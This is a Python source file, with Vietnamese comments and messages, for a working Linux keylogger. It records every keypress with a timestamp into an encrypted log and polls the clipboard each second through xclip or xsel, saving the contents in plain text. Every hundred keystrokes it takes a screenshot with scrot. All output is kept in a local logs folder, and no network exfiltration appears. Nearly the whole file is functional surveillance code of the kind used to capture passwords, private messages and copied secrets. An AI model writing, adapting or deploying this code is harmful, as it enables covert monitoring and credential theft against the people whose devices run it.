from pynput import keyboard
import time
from datetime import datetime
import os
import subprocess
import threading
import sys
import signal
import base64
from cryptography.fernet import Fernet
import json

class Keylogger:
    def __init__(self):
        # Khởi tạo các đường dẫn trong thư mục hiện tại
        self.log_dir = "logs"
        self.screenshot_dir = os.path.join(self.log_dir, "screenshots")
        self.log_file = os.path.join(self.log_dir, "keylog.txt")
        self.clipboard_file = os.path.join(self.log_dir, "clipboard.txt")
        self.config_file = os.path.join(self.log_dir, "config.json")
        
        # Khởi tạo các biến khác
        self.start_time = None
        self.listener = None
        self.last_clipboard = ""
        self.running = True
        self.key_count = 0
        self.screenshot_interval = 100  # Số phím trước khi chụp ảnh
        
        # Tạo thư mục log
        self.ensure_log_directory()
        
        # Khởi tạo mã hóa
        self.init_encryption()
        
        # Đăng ký xử lý tín hiệu
        signal.signal(signal.SIGINT, self.handle_exit)
        signal.signal(signal.SIGTERM, self.handle_exit)
        
    def init_encryption(self):
        """Khởi tạo hoặc tải key mã hóa"""
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'rb') as f:
                    config = json.load(f)
                    self.encryption_key = base64.b64decode(config['key'])
            else:
                self.encryption_key = Fernet.generate_key()
                config = {'key': base64.b64encode(self.encryption_key).decode()}
                with open(self.config_file, 'w') as f:
                    json.dump(config, f)
            
            self.cipher_suite = Fernet(self.encryption_key)
            print("Đã khởi tạo mã hóa thành công")
        except Exception as e:
            print(f"Lỗi khi khởi tạo mã hóa: {e}")
            sys.exit(1)
        
    def ensure_log_directory(self):
        """Tạo thư mục để lưu log"""
        try:
            if not os.path.exists(self.log_dir):
                os.makedirs(self.log_dir)
            if not os.path.exists(self.screenshot_dir):
                os.makedirs(self.screenshot_dir)
            print(f"Thư mục log được tạo tại: {os.path.abspath(self.log_dir)}")
        except Exception as e:
            print(f"Lỗi khi tạo thư mục: {e}")
            sys.exit(1)
    
    def encrypt_data(self, data):
        """Mã hóa dữ liệu trước khi lưu"""
        try:
            return self.cipher_suite.encrypt(data.encode())
        except Exception as e:
            print(f"Lỗi khi mã hóa dữ liệu: {e}")
            return None
    
    def save_log(self, data):
        """Lưu log đã mã hóa"""
        try:
            encrypted_data = self.encrypt_data(data)
            if encrypted_data:
                with open(self.log_file, 'ab') as f:
                    f.write(encrypted_data + b'\n')
        except Exception as e:
            print(f"Lỗi khi lưu log: {e}")
            
    def take_screenshot(self):
        """Chụp ảnh màn hình sử dụng scrot"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            screenshot_path = os.path.join(self.screenshot_dir, f"screenshot_{timestamp}.png")
            
            # Sử dụng scrot với các tùy chọn để chụp ảnh màn hình
            process = subprocess.Popen(
                ['scrot', '-q', '100', '-z', screenshot_path],  # -q: chất lượng, -z: nén
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                env=dict(os.environ, DISPLAY=':0')  # Đảm bảo DISPLAY được set
            )
            output, error = process.communicate(timeout=5)  # Thêm timeout 5 giây
            
            if process.returncode == 0:
                if os.path.exists(screenshot_path) and os.path.getsize(screenshot_path) > 0:
                    print(f"Đã chụp ảnh màn hình: {screenshot_path}")
                else:
                    print("Không thể lưu ảnh chụp màn hình")
            else:
                error_msg = error.decode() if error else "Không xác định được lỗi"
                print(f"Lỗi khi chụp ảnh màn hình: {error_msg}")
                
        except subprocess.TimeoutExpired:
            print("Chụp ảnh màn hình bị timeout")
        except Exception as e:
            print(f"Lỗi khi chụp ảnh màn hình: {e}")
            
    def get_clipboard_content(self):
        """Lấy nội dung clipboard an toàn cho Linux"""
        try:
            # Thử sử dụng xclip trước
            process = subprocess.Popen(['xclip', '-selection', 'clipboard', '-o'], 
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = process.communicate()
            if not error:
                return output.decode('utf-8').strip()
            
            # Nếu xclip không hoạt động, thử xsel
            process = subprocess.Popen(['xsel', '-b'], 
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = process.communicate()
            if not error:
                return output.decode('utf-8').strip()
                
            return ""
        except Exception:
            return ""
            
    def monitor_clipboard(self):
        """Theo dõi clipboard"""
        while self.running:
            try:
                current_clipboard = self.get_clipboard_content()
                if current_clipboard and current_clipboard != self.last_clipboard:
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    log_data = f'[{timestamp}] Clipboard: {current_clipboard}\n'
                    with open(self.clipboard_file, 'a', encoding='utf-8') as f:
                        f.write(log_data)
                    self.last_clipboard = current_clipboard
            except Exception as e:
                print(f"Lỗi khi theo dõi clipboard: {e}")
            time.sleep(1)
    
    def on_key_press(self, key):
        try:
            # Lấy thời gian hiện tại
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            # Chuyển đổi key thành chuỗi
            key_str = str(key).replace("'", "")
            
            # Ghi log phím được nhấn
            log_data = f'[{timestamp}] Phím được nhấn: {key_str}\n'
            self.save_log(log_data)
            
            # Tăng bộ đếm phím
            self.key_count += 1
            
            # Chụp ảnh màn hình theo khoảng thời gian
            if self.key_count % self.screenshot_interval == 0:
                # Chạy chụp ảnh trong thread riêng để không block main thread
                screenshot_thread = threading.Thread(target=self.take_screenshot)
                screenshot_thread.daemon = True
                screenshot_thread.start()
                
        except Exception as e:
            print(f"Lỗi khi ghi log: {e}")
    
    def on_key_release(self, key):
        # Dừng listener khi nhấn Esc
        if key == keyboard.Key.esc:
            self.running = False
            return False
    
    def handle_exit(self, signum, frame):
        """Xử lý khi chương trình bị dừng"""
        print("\nĐang dừng keylogger...")
        self.running = False
        self.cleanup()
        sys.exit(0)
    
    def cleanup(self):
        """Dọn dẹp trước khi thoát"""
        try:
            duration = time.time() - self.start_time
            print(f"\nKeylogger đã dừng. Thời gian chạy: {duration:.2f} giây")
            print(f"Log đã được lưu tại: {os.path.abspath(self.log_file)}")
            print(f"Clipboard log đã được lưu tại: {os.path.abspath(self.clipboard_file)}")
            print(f"Ảnh chụp màn hình đã được lưu tại: {os.path.abspath(self.screenshot_dir)}")
            print("\nĐể giải mã log, chạy lệnh: python decrypt_log.py")
        except Exception as e:
            print(f"Lỗi khi dọn dẹp: {e}")
    
    def start(self):
        print("Keylogger đã bắt đầu. Nhấn 'Esc' để dừng.")
        self.start_time = time.time()
        
        try:
            # Bắt đầu theo dõi clipboard trong thread riêng
            clipboard_thread = threading.Thread(target=self.monitor_clipboard, daemon=True)
            clipboard_thread.start()
            
            # Bắt đầu lắng nghe sự kiện bàn phím
            with keyboard.Listener(
                on_press=self.on_key_press,
                on_release=self.on_key_release) as listener:
                listener.join()
                
        except Exception as e:
            print(f"Lỗi không mong muốn: {e}")
        finally:
            self.cleanup()

if __name__ == "__main__":
    try:
        keylogger = Keylogger()
        keylogger.start()
    except KeyboardInterrupt:
        print("\nĐang dừng keylogger...")
        sys.exit(0) 